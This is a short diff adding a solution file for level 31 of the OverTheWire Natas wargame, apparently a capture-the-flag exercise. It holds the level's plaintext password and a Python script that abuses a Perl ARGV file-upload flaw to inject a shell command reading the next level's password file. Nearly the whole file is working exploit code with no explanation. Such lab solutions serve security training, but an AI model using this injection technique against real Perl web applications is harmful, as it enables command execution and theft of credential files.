@@ -1,0 +1,11 @@
+natas31:AMZF14yknOn9Uc57uKB02jnYuhplYka3
+
+import requests
+
+url = 'http://natas31.natas.labs.overthewire.org'
+s = requests.Session()
+s.auth = ('natas31', 'AMZF14yknOn9Uc57uKB02jnYuhplYka3')
+
+index = '/index.pl?cat /etc/natas_webpass/natas32 | xargs echo |'
+r = s.post(url + index, files=[('file', ('filename', 'abc'))], data={'file': 'ARGV'})
+print(r.text)
